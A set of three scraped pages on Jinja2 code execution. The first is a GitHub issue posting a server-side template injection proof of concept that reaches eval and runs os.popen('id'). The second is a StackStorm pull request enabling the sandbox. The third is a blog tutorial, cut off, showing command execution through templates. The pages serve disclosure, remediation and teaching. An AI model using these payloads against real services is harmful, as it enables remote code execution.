=== Content from github.com_90d86df5_20250115_093156.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpallets%2Fjinja%2Fissues%2F549)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpallets%2Fjinja%2Fissues%2F549)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=pallets%2Fjinja)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[pallets](/pallets)
/
**[jinja](/pallets/jinja)**
Public

* [Notifications](/login?return_to=%2Fpallets%2Fjinja) You must be signed in to change notification settings
* [Fork
  1.6k](/login?return_to=%2Fpallets%2Fjinja)
* [Star
   10.5k](/login?return_to=%2Fpallets%2Fjinja)

* [Code](/pallets/jinja)
* [Issues
  61](/pallets/jinja/issues)
* [Pull requests
  16](/pallets/jinja/pulls)
* [Discussions](/pallets/jinja/discussions)
* [Actions](/pallets/jinja/actions)
* [Security](/pallets/jinja/security)
* [Insights](/pallets/jinja/pulse)

Additional navigation options

* [Code](/pallets/jinja)
* [Issues](/pallets/jinja/issues)
* [Pull requests](/pallets/jinja/pulls)
* [Discussions](/pallets/jinja/discussions)
* [Actions](/pallets/jinja/actions)
* [Security](/pallets/jinja/security)
* [Insights](/pallets/jinja/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fpallets%2Fjinja%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fpallets%2Fjinja%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Execute arbitrary codes in template without sandbox environment. #549

Closed

[RickGray](/RickGray) opened this issue
Feb 23, 2016
¬∑ 6 comments

Closed

# [Execute arbitrary codes in template without sandbox environment.](#top) #549

[RickGray](/RickGray) opened this issue
Feb 23, 2016
¬∑ 6 comments

## Comments

[![@RickGray](https://avatars.githubusercontent.com/u/7438663?s=80&u=5b998f7c7c1e414cde243250537607bdad990687&v=4)](/RickGray)

Copy link

### **[RickGray](/RickGray)** commented [Feb 23, 2016](#issue-135685433)

| When i use Jinja2 template framework in my project, i found a way to call "os.popen('id')" or another functions without global register. It's easy to get shell when attacker can control the template content. Is that such a design?  PoC:  ``` from jinja2 import Template  content = ''' {% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %} {% for b in c.__init__.func_globals.values() %} {% if b.__class__ == {}.__class__ %} {% if 'eval' in b.keys() %} {{ b['eval']('__import__("os").popen("id").read()') }} {% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %} ''' print Template(content).render() ```  I test this code with python2 (2.7.10) and Jinja2 (2.8), if it works will print your user's uid... |
| --- |
| The text was updated successfully, but these errors were encountered: |

 üëç
1
 arel reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

[![@ThiefMaster](https://avatars.githubusercontent.com/u/179599?s=80&v=4)](/ThiefMaster)

Copy link

Member

### **[ThiefMaster](/ThiefMaster)** commented [Feb 23, 2016](#issuecomment-187625168)

| You should not execute untrusted templates in a non-sandboxed environment. That's exactly why the sandbox exists (and to be honest, even with a sandbox I would not let users provide arbitrary Jinja templates) |
| --- |

 üëç
2
 jeffwidman and arel reacted with thumbs up emoji

All reactions

* üëç
  2 reactions

Sorry, something went wrong.

[![@RickGray](https://avatars.githubusercontent.com/u/7438663?s=80&u=5b998f7c7c1e414cde243250537607bdad990687&v=4)](/RickGray)

Copy link

Author

### **[RickGray](/RickGray)** commented [Feb 24, 2016](#issuecomment-188037668)

| So, is it necessary to take measures to prevent this case? I think there some specific application would allow users to edit the template content, but there is no practical examples. |
| --- |

All reactions

Sorry, something went wrong.

[![@RickGray](https://avatars.githubusercontent.com/u/7438663?s=80&u=5b998f7c7c1e414cde243250537607bdad990687&v=4)](/RickGray)

Copy link

Author

### **[RickGray](/RickGray)** commented [Feb 24, 2016](#issuecomment-188059938)

| I think it is necessary to use sandbox by defualt, because flask or another web framework used Jinja2 is not do this. |
| --- |

All reactions

Sorry, something went wrong.

[![@ThiefMaster](https://avatars.githubusercontent.com/u/179599?s=80&v=4)](/ThiefMaster)

Copy link

Member

### **[ThiefMaster](/ThiefMaster)** commented [Feb 24, 2016](#issuecomment-188173586)

| Why would you want to use the sandbox by default? In most cases templates cannot be changed by untrusted people who don't have access to the code anyway. |
| --- |

 üëé
1
 arel reacted with thumbs down emoji

All reactions

* üëé
  1 reaction

Sorry, something went wrong.

[![@RickGray](https://avatars.githubusercontent.com/u/7438663?s=80&u=5b998f7c7c1e414cde243250537607bdad990687&v=4)](/RickGray)

Copy link

Author

### **[RickGray](/RickGray)** commented [Mar 29, 2016](#issuecomment-202672714)

| There is a case about remote code execution via Flask/Jinja2 template injection in Uber. link: <http://www.tuicool.com/articles/uE3YNjY> |
| --- |

All reactions

Sorry, something went wrong.

[![@untitaker](https://avatars.githubusercontent.com/u/837573?s=80&u=4b106f1ba83b3028677a861efe31c46d703e77ff&v=4)](/untitaker)

Copy link

Contributor

### **[untitaker](/untitaker)** commented [Apr 12, 2016](#issuecomment-209074986)

| Enabling sandboxing by default is not possible due to backwards compat, and also not reasonable because most templates (in Flask) are trusted. |
| --- |

 üëé
1
 arel reacted with thumbs down emoji

All reactions

* üëé
  1 reaction

Sorry, something went wrong.

[![@untitaker](https://avatars.githubusercontent.com/u/837573?s=40&u=4b106f1ba83b3028677a861efe31c46d703e77ff&v=4)](/untitaker)
[untitaker](/untitaker)
closed this as [completed](/pallets/jinja/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Apr 12, 2016](#event-624709643)

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)](/apps/github-actions)
[github-actions](/apps/github-actions)
bot
locked as **resolved** and limited conversation to collaborators
[Nov 13, 2020](#event-3995485221)

[Sign up for free](/join?source=comment-repo)
**to subscribe to this conversation on GitHub**.
Already have an account?
[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpallets%2Fjinja%2Fissues%2F549).

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

3 participants

[![@ThiefMaster](https://avatars.githubusercontent.com/u/179599?s=52&v=4)](/ThiefMaster) [![@untitaker](https://avatars.githubusercontent.com/u/837573?s=52&v=4)](/untitaker) [![@RickGray](https://avatars.githubusercontent.com/u/7438663?s=52&v=4)](/RickGray)

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_0cbbb920_20250115_093155.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FStackStorm%2Fst2%2Fpull%2F5359)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FStackStorm%2Fst2%2Fpull%2F5359)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=StackStorm%2Fst2)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[StackStorm](/StackStorm)
/
**[st2](/StackStorm/st2)**
Public

* [Notifications](/login?return_to=%2FStackStorm%2Fst2) You must be signed in to change notification settings
* [Fork
  746](/login?return_to=%2FStackStorm%2Fst2)
* [Star
   6.1k](/login?return_to=%2FStackStorm%2Fst2)

* [Code](/StackStorm/st2)
* [Issues
  540](/StackStorm/st2/issues)
* [Pull requests
  45](/StackStorm/st2/pulls)
* [Discussions](/StackStorm/st2/discussions)
* [Actions](/StackStorm/st2/actions)
* [Wiki](/StackStorm/st2/wiki)
* [Security](/StackStorm/st2/security)
* [Insights](/StackStorm/st2/pulse)

Additional navigation options

* [Code](/StackStorm/st2)
* [Issues](/StackStorm/st2/issues)
* [Pull requests](/StackStorm/st2/pulls)
* [Discussions](/StackStorm/st2/discussions)
* [Actions](/StackStorm/st2/actions)
* [Wiki](/StackStorm/st2/wiki)
* [Security](/StackStorm/st2/security)
* [Insights](/StackStorm/st2/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FStackStorm%2Fst2%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FStackStorm%2Fst2%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Use Jinja sandboxed environment #5359

 Merged

[amanda11](/amanda11)
merged 6 commits into
[master](/StackStorm/st2/tree/master "StackStorm/st2:master")
from
[use\_sandbox\_jinja](/StackStorm/st2/tree/use_sandbox_jinja "StackStorm/st2:use_sandbox_jinja")

Sep 20, 2021

 Merged

# [Use Jinja sandboxed environment](#top) #5359

[amanda11](/amanda11)
merged 6 commits into
[master](/StackStorm/st2/tree/master "StackStorm/st2:master")
from
[use\_sandbox\_jinja](/StackStorm/st2/tree/use_sandbox_jinja "StackStorm/st2:use_sandbox_jinja")

Sep 20, 2021

[Conversation
3](/StackStorm/st2/pull/5359)
[Commits
6](/StackStorm/st2/pull/5359/commits)
[Checks
0](/StackStorm/st2/pull/5359/checks)
[Files changed](/StackStorm/st2/pull/5359/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![amanda11](https://avatars.githubusercontent.com/u/12607239?s=60&v=4)](/amanda11)

Copy link

Contributor

### @amanda11 **[amanda11](/amanda11)** commented [Sep 16, 2021](#issue-998582842) ‚Ä¢ edited Loading

Use Jinja sandboxed environment, so that any templates that attempt to access insecure code will be rejected.

Sorry, something went wrong.

All reactions

[![@amanda11](https://avatars.githubusercontent.com/u/12607239?s=40&v=4)](/amanda11)

`[Use Jinja sandboxed environment](/StackStorm/st2/pull/5359/commits/94a4dc82011ae6803f6222871fadf588b181e3e6 "Use Jinja sandboxed environment")`

`[94a4dc8](/StackStorm/st2/pull/5359/commits/94a4dc82011ae6803f6222871fadf588b181e3e6)`

[![@pull-request-size](https://avatars.githubusercontent.com/in/20019?s=40&v=4)](/apps/pull-request-size)
[pull-request-size](/apps/pull-request-size)
bot
added
the
[size/XS](/StackStorm/st2/labels/size/XS)
PR that changes 0-9 lines. Quick fix/merge.
label
[Sep 16, 2021](#event-5314782391)

[![@amanda11](https://avatars.githubusercontent.com/u/12607239?s=40&v=4)](/amanda11)
[amanda11](/amanda11)
added this to the [3.6.0](/StackStorm/st2/milestone/44) milestone
[Sep 16, 2021](#event-5314801468)

[![nzlosh](https://avatars.githubusercontent.com/u/2700069?s=60&v=4)](/nzlosh)

**[nzlosh](/nzlosh)**
approved these changes
[Sep 16, 2021](#pullrequestreview-756745966)

 [View reviewed changes](/StackStorm/st2/pull/5359/files/94a4dc82011ae6803f6222871fadf588b181e3e6)

[![m4dcoder](https://avatars.githubusercontent.com/u/2767408?s=60&v=4)](/m4dcoder)

**[m4dcoder](/m4dcoder)**
requested changes
[Sep 16, 2021](#pullrequestreview-756911018)

 [View reviewed changes](/StackStorm/st2/pull/5359/files/94a4dc82011ae6803f6222871fadf588b181e3e6)

Copy link

Contributor

### @m4dcoder **[m4dcoder](/m4dcoder)** left a comment ‚Ä¢ edited Loading

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

* Do we need to update Jinja >= 2.11 in requirements?
* Please update orquesta version in requirements to use the commit with the similar fix (after [Use Jinja sandboxed environment¬†orquesta#240](https://github.com/StackStorm/orquesta/pull/240) is merged).
* Please add a changelog entry.
* Please update description of this PR on why this fix is needed.

Sorry, something went wrong.

All reactions

[![@amanda11](https://avatars.githubusercontent.com/u/12607239?s=40&v=4)](/amanda11)

`[Add change log](/StackStorm/st2/pull/5359/commits/f643ac560157c250471ec780cf5f0717e7cdfa68 "Add change log")`

`[f643ac5](/StackStorm/st2/pull/5359/commits/f643ac560157c250471ec780cf5f0717e7cdfa68)`

[![@amanda11](https://avatars.githubusercontent.com/u/12607239?s=80&v=4)](/amanda11)

Copy link

Contributor

Author

### **[amanda11](/amanda11)** commented [Sep 17, 2021](#issuecomment-921646535)

| * Do we need to update Jinja >= 2.11 in requirements? * Please update orquesta version in requirements to use the commit with the similar fix (after [StackStorm/orquesta#240](https://github.com/StackStorm/orquesta/pull/240) is merged). * Please add a changelog entry. * Please update description of this PR on why this fix is needed.  [@m4dcoder](https://github.com/m4dcoder) I've addressed your requirements, Jinja is already at 2.11 in the requirements on ST2 requirements. |
| --- |

All reactions

Sorry, something went wrong.

[![@pull-request-size](https://avatars.githubusercontent.com/in/20019?s=40&v=4)](/apps/pull-request-size)
[pull-request-size](/apps/pull-request-size)
bot
added
[size/S](/StackStorm/st2/labels/size/S)
PR that changes 10-29 lines. Very easy to review.
and removed
[size/XS](/StackStorm/st2/labels/size/XS)
PR that changes 0-9 lines. Quick fix/merge.
labels
[Sep 17, 2021](#event-5321334408)

 [amanda11](/amanda11)
and others
added 4 commits
[September 17, 2021 21:02](#commits-pushed-5f00a27)

[![@amanda11](https://avatars.githubusercontent.com/u/12607239?s=40&v=4)](/amanda11)

`[Temporarily refer to specific orquesta commit](/StackStorm/st2/pull/5359/commits/5f00a27c5b06e70cdb211c278dd35d7ba5d96f87 "Temporarily refer to specific orquesta commit")`

`[5f00a27](/StackStorm/st2/pull/5359/commits/5f00a27c5b06e70cdb211c278dd35d7ba5d96f87)`

[![@amanda11](https://avatars.githubusercontent.com/u/12607239?s=40&v=4)](/amanda11)

`[Need to update networkx to match orquesta](/StackStorm/st2/pull/5359/commits/7bafcd9c400b30657faef9980db5bf262b787157 "Need to update networkx to match orquesta")`

`[7bafcd9](/StackStorm/st2/pull/5359/commits/7bafcd9c400b30657faef9980db5bf262b787157)`

[![@m4dcoder](https://avatars.githubusercontent.com/u/2767408?s=40&v=4)](/m4dcoder)

`[Update orquesta version with the Jinja sandboxed environment fix](/StackStorm/st2/pull/5359/commits/bba7fccb1111c08feccffb0c133e60b3222250fe "Update orquesta version with the Jinja sandboxed environment fix")`

`[bba7fcc](/StackStorm/st2/pull/5359/commits/bba7fccb1111c08feccffb0c133e60b3222250fe)`

[![@m4dcoder](https://avatars.githubusercontent.com/u/2767408?s=40&v=4)](/m4dcoder)

`[Update method calls to get nodes from DiGraph](/StackStorm/st2/pull/5359/commits/c805e3342f94cfa33932e4ccc0339c017d324b4f "Update method calls to get nodes from DiGraph

The networkx library has changed some interfaces in v2.x. The node attribute
is no longer a member of DiGraph therefore use nodes attribute instead.")`
 ‚Ä¶

`[c805e33](/StackStorm/st2/pull/5359/commits/c805e3342f94cfa33932e4ccc0339c017d324b4f)`

```
The networkx library has changed some interfaces in v2.x. The node attribute
is no longer a member of DiGraph therefore use nodes attribute instead.
```

[![@pull-request-size](https://avatars.githubusercontent.com/in/20019?s=40&v=4)](/apps/pull-request-size)
[pull-request-size](/apps/pull-request-size)
bot
added
[size/M](/StackStorm/st2/labels/size/M)
PR that changes 30-99 lines. Good size to review.
and removed
[size/S](/StackStorm/st2/labels/size/S)
PR that changes 10-29 lines. Very easy to review.
labels
[Sep 18, 2021](#event-5322131634)

[![@CLAassistant](https://avatars.githubusercontent.com/u/11571300?s=80&u=04709ab66059d1fb5246ce2d47bd3bc44e639ee0&v=4)](/CLAassistant)

Copy link

### **[CLAassistant](/CLAassistant)** commented [Sep 18, 2021](#issuecomment-922153925) ‚Ä¢ edited Loading

| [CLA assistant check](https://cla-assistant.io/StackStorm/st2?pullRequest=5359) All committers have signed the CLA. |
| --- |

All reactions

Sorry, something went wrong.

[![m4dcoder](https://avatars.githubusercontent.com/u/2767408?s=60&v=4)](/m4dcoder)

**[m4dcoder](/m4dcoder)**
approved these changes
[Sep 18, 2021](#pullrequestreview-757932620)

 [View reviewed changes](/StackStorm/st2/pull/5359/files/c805e3342f94cfa33932e4ccc0339c017d324b4f)

[![@amanda11](https://avatars.githubusercontent.com/u/12607239?s=40&v=4)](/amanda11)
[amanda11](/amanda11)
merged commit [`e97659c`](/StackStorm/st2/commit/e97659c5c1d39863d870a081787a176eb8e260c4)
into
master

[Sep 20, 2021](https://github.com/StackStorm/st2/pull/5359#event-5326768676)

 [![@amanda11](https://avatars.githubusercontent.com/u/12607239?s=40&v=4)](/amanda11)
[amanda11](/amanda11)
deleted the
use\_sandbox\_jinja

branch
[September 20, 2021 08:38](#event-5326768725)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2FStackStorm%2Fst2%2Fpull%2F5359)

Reviewers

[![@m4dcoder](https://avatars.githubusercontent.com/u/2767408?s=40&v=4)](/m4dcoder) [m4dcoder](/m4dcoder)

m4dcoder approved these changes

[![@nzlosh](https://avatars.githubusercontent.com/u/2700069?s=40&v=4)](/nzlosh) [nzlosh](/nzlosh)

nzlosh approved these changes

Assignees

No one assigned

Labels

[size/M](/StackStorm/st2/labels/size/M)
PR that changes 30-99 lines. Good size to review.

Projects

None yet

Milestone

 [**3.6.0**](/StackStorm/st2/milestone/44 "3.6.0")

Development

Successfully merging this pull request may close these issues.

4 participants

[![@amanda11](https://avatars.githubusercontent.com/u/12607239?s=52&v=4)](/amanda11) [![@CLAassistant](https://avatars.githubusercontent.com/u/11571300?s=52&v=4)](/CLAassistant) [![@nzlosh](https://avatars.githubusercontent.com/u/2700069?s=52&v=4)](/nzlosh) [![@m4dcoder](https://avatars.githubusercontent.com/u/2767408?s=52&v=4)](/m4dcoder)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from podalirius.net_59679966_20250115_093156.html ===

[Podalirius](https://podalirius.net/en/)

* [Articles](https://podalirius.net/en/articles/)
* [Writeups](https://podalirius.net/en/writeups/)
* [Publications](https://podalirius.net/en/publications/)
* [CVEs](https://podalirius.net/en/cves/)
* |
* [![](https://podalirius.net/en/public/flag_fr.png)](https://podalirius.net/fr/articles/python-vulnerabilities-code-execution-in-jinja-templates/)
* |

# Python vulnerabilities : Code execution in jinja templates

July 27, 2021

5-minute read

[research](https://podalirius.net/en/categories/research/)
√¢¬Ä¬¢
[poc](https://podalirius.net/en/categories/poc/)

[python](https://podalirius.net/en/tags/python/)
√¢¬Ä¬¢
[vulnerabilities](https://podalirius.net/en/tags/vulnerabilities/)
√¢¬Ä¬¢
[jinja](https://podalirius.net/en/tags/jinja/)
√¢¬Ä¬¢
[jinja2](https://podalirius.net/en/tags/jinja2/)
√¢¬Ä¬¢
[code](https://podalirius.net/en/tags/code/)
√¢¬Ä¬¢
[injection](https://podalirius.net/en/tags/injection/)
√¢¬Ä¬¢
[exploit](https://podalirius.net/en/tags/exploit/)
√¢¬Ä¬¢
[execution](https://podalirius.net/en/tags/execution/)
√¢¬Ä¬¢
[server](https://podalirius.net/en/tags/server/)
√¢¬Ä¬¢
[side](https://podalirius.net/en/tags/side/)
√¢¬Ä¬¢
[template](https://podalirius.net/en/tags/template/)
√¢¬Ä¬¢
[injection](https://podalirius.net/en/tags/injection/)
√¢¬Ä¬¢
[contexte](https://podalirius.net/en/tags/contexte/)
√¢¬Ä¬¢
[independant](https://podalirius.net/en/tags/independant/)
√¢¬Ä¬¢
[ssti](https://podalirius.net/en/tags/ssti/)

**Table of contents :**

* [Introduction](#introduction)
* [The jinja2 template engine](#the-jinja2-template-engine)
* [Template object of jinja2](#template-object-of-jinja2)
* [Execution of commands](#execution-of-commands)
* [The TemplateReference object](#the-templatereference-object)
* [Building a classic payload](#building-a-classic-payload)
* [A context-independent payload](#a-context-independent-payload)
* [References](#references)

---

## Introduction

Some time ago I presented an article on [format string vulnerabilities in Python](https://podalirius.net/en/en/articles/python-format-string-vulnerabilities/) in which I explained the dangers of format strings, if they are misused. Today I‚Äôm going to present a fairly similar vulnerability, allowing code execution in the templates of the [jinja](https://github.com/pallets/jinja) module. This type of behavior is very useful for exploiting Server Side Template Injection (SSTI) vulnerabilities.

## The jinja2 template engine

The jinja2 template engine allows you to generate documents (strings, web pages ‚Ä¶) from templates. This greatly simplifies the code and saves time. For example for a website, instead of writing the header block `<head>` in all the pages, we can create a single `head.jinja2` template that will be included in all the pages. So when it is necessary to modify the content of the header, there will only be one file to modify.

Here is an example of a jinja2 template:

```
<!DOCTYPE html>
<html lang="en">
<head>
    <title>My Webpage</title>
    <link rel="stylesheet" href="/css/main.css">
</head>
<body>
    <ul id="navigation">
    {% for item in navigation %}
        <li><a href="{{ item.href }}">{{ item.caption }}</a></li>
    {% endfor %}
    </ul>

    <h1>My Webpage</h1>
    {{ a_variable }}

    {# a comment #}
</body>
</html>

```
## Template object of jinja2

In the jinja2 engine, templates are created from the [Template](https://jinja.palletsprojects.com/en/3.0.x/templates/) object of the module. Thanks to this type of object, we can create templates very easily, in the same way as format strings:

```
>>> from jinja2 import Template
>>> msg = Template("My name is {{ name }}").render(name="John Doe")
>>> print(msg)
'My name is John Doe'

```

When we generate the string with `.render(...)` the jinja2 engine uses the `name=` object passed as a parameter and replaces it in the `{{ name }}` location of the template which gives us the result `'My name is John Doe'`.

## Execution of commands

In Python, format strings allow us to access the properties of objects, but not to call the methods of these. In the `jinja2` engine, we can execute functions specific to objects passed as parameters. Let‚Äôs take an example:

```
>>> import os
>>> from jinja2 import Template
>>> msg = Template("My name is {{ s.upper() }}").render(s="thisisastring")
>>> print(msg)
'My name is THISISASTRING'

```

Similarly, we can run commands if we have access to the `os` module from the `jinja2` Template:

```
>>> import os
>>> from jinja2 import Template
>>> msg = Template("My name is {{ module.system('id') }}").render(module=os)
uid=1000(user) gid=1000(user) groups=1000(user)
>>> print(msg)
'My name is 0'

```

In the example above, we import the `os` and `jinja2` modules and then we create a template. The template contains `{{ module.system('id') }}` allowing to call a function of the module used (here `os`). When rendering the template, `os.system('id')` is executed.

## The TemplateReference object

